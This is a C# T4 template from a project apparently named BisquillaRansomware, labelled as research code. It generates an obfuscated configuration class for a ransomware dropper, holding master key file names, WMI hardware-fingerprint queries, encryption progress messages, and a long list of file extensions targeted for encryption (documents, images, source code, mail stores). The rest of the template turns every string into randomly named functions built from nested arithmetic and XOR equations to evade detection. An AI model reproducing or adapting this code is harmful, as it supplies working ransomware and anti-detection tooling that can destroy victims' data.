<#@ template hostspecific="false" language="C#" #>
<#@ assembly name="System.Core" #>
<#@ import namespace="System.Linq" #>
<#@ import namespace="System.Text" #>
<#@ import namespace="System.Collections.Generic" #>
<#@ output extension=".cs" #>

/************************************************************************************************************
 * This code is created and maintened only for a research proposal. Please do not use for other proposes.   *
 * Author: Th3 0bservator                                                                                   *
 * Source: https://github.com/guibacellar/BisquillaRansomware                                               *
 * Site: https://www.theobservator.net                                                                      *
 ************************************************************************************************************/

//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a T4 template on 'ConfigurationManagerPartialGenerated.tt' file.
//     Generated on: <#=System.DateTime.Now.ToString()#>
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated. Re-run the T4 template to update this file.
// </auto-generated>
//------------------------------------------------------------------------------

using System;
namespace BisquillaRansomware
{
	/// <summary>
    /// Dropper Generated Partial Main Class. This file is auto generated and contains all constants from Program Class. The generation process protect all the strings.
    /// </summary>
	partial class ConfigurationManager {
	
		/****************** Key Configuration ******************/

        /// <summary>
        /// Encoded Master Public Key File Name - CAN BE CHANGED 
        /// </summary
		private static readonly string C_PUB = <# Encode("mpuk.info", ";"); #>
		
        /// <summary>
        /// Encoded Master Private Key File Name - CAN BE CHANGED 
        /// </summary
		private static readonly string C_PRI = <# Encode("mprk.info", ";"); #>

        /// <summary>
        /// Path of Local Copy of Master Public Key
        /// </summary>
        public static readonly string LOCAL_PUB_KEY_NAME = System.IO.Path.Combine(System.Windows.Forms.Application.LocalUserAppDataPath, C_PUB);

        /// <summary>
        /// Path of Local Copy of Master Private Key
        /// </summary>
        public static readonly string LOCAL_PRI_KEY_NAME = System.IO.Path.Combine(System.Windows.Forms.Application.LocalUserAppDataPath, C_PRI);


		/****************** Device ID Configuration ******************/
		public static readonly string HARDWARE_INFO = 
            
        // BIOS
		<# Encode("Win32_BIOS;Manufacturer@Win32_BIOS;SMBIOSBIOSVersion@Win32_BIOS;IdentificationCode@Win32_BIOS;SerialNumber@Win32_BIOS;ReleaseDate@Win32_BIOS;Version", ""); #>
        
		+ <# Encode("@", ""); #> +

        // HDD
		<# Encode("Win32_DiskDrive;Model@Win32_DiskDrive;Manufacturer@Win32_DiskDrive;Signature@Win32_DiskDrive;TotalHeads", ""); #>
     
		+ <# Encode("@", ""); #> +

        // Processor
		<# Encode("Win32_Processor;ProcessorId@Win32_Processor;Manufacturer", "");  #>

        + <# Encode("@", ""); #> +

        // BOARD
		<# Encode("Win32_BaseBoard;Model@Win32_BaseBoard;Manufacturer@Win32_BaseBoard;Name@Win32_BaseBoard;SerialNumber", "");  #>
        ;
        

		/****************** UI Messages ******************/
		public static readonly string MESSAGE_FEC = <# Encode("File Encryption Completed", ";"); #>
		public static readonly string MESSAGE_FDC = <# Encode("File Decryption Completed", ";"); #>
		public static readonly string MESSAGE_FEP = <# Encode("File Encryption in Progress", ";"); #>
		public static readonly string MESSAGE_FDP = <# Encode("File Decryption in Progress", ";"); #>


		/****************** Target Files ******************/
        /// <summary>
        /// Target File Extension Allowed for Encription - CAN BE CHANGED
        /// </summary>
        public static readonly string[] TARGET_FILES = new string[]
        { 
			<# 
				String[] targets = new String[] { 
					".JPG", ".GIF", ".PDF", ".PNG", ".NEF",
					".ZIP", ".RAR", ".TAR", ".GZ", ".ASP", ".ASPX", 
					".CS", ".VB", ".JAVA", ".CLASS", ".JS", ".VBS", ".CSC", ".JSON", ".TXT", ".C", ".CPP", ".H", ".CONFIG", ".PY", ".R", ".XAML", ".JSP", ".PHP",
					".DOC", ".DOCX", ".XLS", ".XLSX", ".PPT", ".PPTX",
					".MP3", ".MP4", ".AVI", ".MPEG",
					".PST", ".MSG", ".EML", ".DBX", ".MBX", ".WAB", ".JAR"
				};	

				foreach(String t in targets) {
					Encode(t, ",");
				}
			
			
			#>
            
        };

		// Write Functions Here
		<# Write(allFunctions); #>
	}
}



<#+
    System.Random random = new Random((int)System.DateTime.UtcNow.Ticks);
	char[] nameMatrix = new char[] { '1', '0', 'O', 'l' };
	string allFunctions = "";

	/// <summary>
	/// Generate Random Function Name
	/// </summary>
	/// <param name="size"></param>
	/// <returns></returns>
    string GenerateRandomFunctionName(int size)
    {
        StringBuilder sb = new StringBuilder();

        sb.Append("_");
        for (int i = 0; i < size; i++)
        {
            sb.Append(nameMatrix[random.Next(0, nameMatrix.Length)]);
        }

        return sb.ToString();
    }

    /// <summary>
    /// Generate Random Byte
    /// </summary>
    byte GenerateRandomByte(int min, int max)
    {
        return (byte)random.Next(min, max);
    }

    /// <summary>
    /// Generate Random Key in Base64
    /// </summary>
    byte[] GenerateRandomKeyInBase64(int size)
    {
        byte[] hResult = new byte[size];
        random.NextBytes(hResult);
        return hResult;
    }

    /// <summary>
    /// Apply OTP Encryption
    /// </summary>
    /// <param name="source">Source Data</param>
    /// <param name="key">Key</param>
    /// <returns></returns>
    byte[] EncryptDecrypt(byte[] source, byte[] key)
    {
        byte[] hResult = new byte[source.Length];

        for (int i = 0; i < source.Length; i++)
        {
            hResult[i] = (byte)(source[i] ^ key[i]);
        }

        return hResult;
    }

    /// <summary>
    /// Decompose String into Char
    /// </summary>
    /// <param name="str"></param>
    /// <returns></returns>
    string DecomposeStringIntoChar(String str)
    {
        StringBuilder hResult = new StringBuilder();

        hResult.Append("(");
        foreach (char item in str)
        {
            int mode = GenerateRandomByte(1, 3);
            switch (mode)
            {
                case 1:
                    hResult.AppendFormat("((char) {0})+\"\"", DecomposeNumberIntoEquation(item, GenerateRandomByte(3, 8), true));
                    break;

                default:
                    hResult.AppendFormat("\"{0}\"", item);
                    break;
            }

            hResult.Append("+");
        }
        hResult = hResult.Remove(hResult.Length - 1, 1);
        hResult.Append(")");

        return hResult.ToString();
    }

    /// <summary>
    /// Convert a Number into Other Format
    /// </summary>
    /// <param name="number"></param>
    /// <returns></returns>
    string ConvertNumberIntoOtherFormat(int number)
    {
        int mode = GenerateRandomByte(1, 5);
        int decomposeEquationLevels = GenerateRandomByte(3, 8);

        switch (mode)
        {
            case 1: // Simple String
                return String.Format("int.Parse({0})", DecomposeStringIntoChar(number.ToString()));

            case 2: // Binary
                    return String.Format("Convert.ToInt32({0}, {1})", DecomposeStringIntoChar(Convert.ToString(number, 2)), DecomposeNumberIntoEquation(2, decomposeEquationLevels, true));

            case 3: // Hex
                return String.Format("Convert.ToInt32({0}, {1})", DecomposeStringIntoChar(Convert.ToString(number, 16)), DecomposeNumberIntoEquation(16, decomposeEquationLevels, true));

            case 4: // Octal
                return String.Format("Convert.ToInt32({0}, {1})", DecomposeStringIntoChar(Convert.ToString(number, 8)), DecomposeNumberIntoEquation(8, decomposeEquationLevels, true));

            default:
                return DecomposeNumberIntoEquation(number, decomposeEquationLevels).ToString();
        }

            
    }

    /// <summary>
    /// Decompose Number into Equation
    /// </summary>
    /// <param name="number">Target Number</param>
    /// <param name="level">Current Level</param>
    /// <param name="doNotDecomposeIntoOtherFormat">Avoid to Decompose into Other Format</param>
    /// <returns>Equation</returns>
    string DecomposeNumberIntoEquation(int number, int level, bool doNotDecomposeIntoOtherFormat=false)
    {
        if (level <= 1 || number <= 1)
        {
            if (doNotDecomposeIntoOtherFormat)
            {
                return number.ToString();
            }
            return ConvertNumberIntoOtherFormat(number);
        }

        StringBuilder hResult = new StringBuilder();

        int mode = GenerateRandomByte(1, 4);
        int currentNumber = number;

        int randomElement = GenerateRandomByte(1, currentNumber - 1);

        switch (mode)
        {
            case 1: // Simple Subtraction
                currentNumber -= randomElement;
                hResult.AppendFormat("({0}+{1})", DecomposeNumberIntoEquation(currentNumber, level-1, doNotDecomposeIntoOtherFormat), DecomposeNumberIntoEquation(randomElement, level-1, doNotDecomposeIntoOtherFormat));
                break;

            case 2: // Simple Adition
                currentNumber += randomElement;
                hResult.AppendFormat("({0}-{1})", DecomposeNumberIntoEquation(currentNumber, level - 1, doNotDecomposeIntoOtherFormat), DecomposeNumberIntoEquation(randomElement, level - 1, doNotDecomposeIntoOtherFormat));
                break;

            case 3: // XOR
                currentNumber = currentNumber ^ randomElement;
                hResult.AppendFormat("({0}^{1})", DecomposeNumberIntoEquation(currentNumber, level - 1, doNotDecomposeIntoOtherFormat), DecomposeNumberIntoEquation(randomElement, level - 1, doNotDecomposeIntoOtherFormat));
                break;

            default:
                throw new NotImplementedException();
        }

        return hResult.ToString();
    }

    /// <summary>
    /// Obfuscate String
    /// </summary>
    /// <param name="input"></param>
    /// <returns></returns>
    public string ObfuscateString(String input, String functionName)
    {
        StringBuilder sb = new StringBuilder();

        sb.Append("static string " + functionName + "() {");
        sb.Append("return new String(new char[] { ");

        foreach (char item in input)
        {
            sb.AppendFormat("\r\n(char) {0},", DecomposeNumberIntoEquation(item, 5));
        }

        sb.Append("});");
        sb.Append("}");

        return sb.ToString();
    }

	void Encode(String input, String separator) 
	{
		String functionName = GenerateRandomFunctionName(50);
		String decodeMethod = ObfuscateString(input, functionName);

		Write(functionName);
		Write("()" + separator + "// " + input);
		WriteLine("");

		allFunctions+="\r\n";
		allFunctions+=decodeMethod;
	}

#>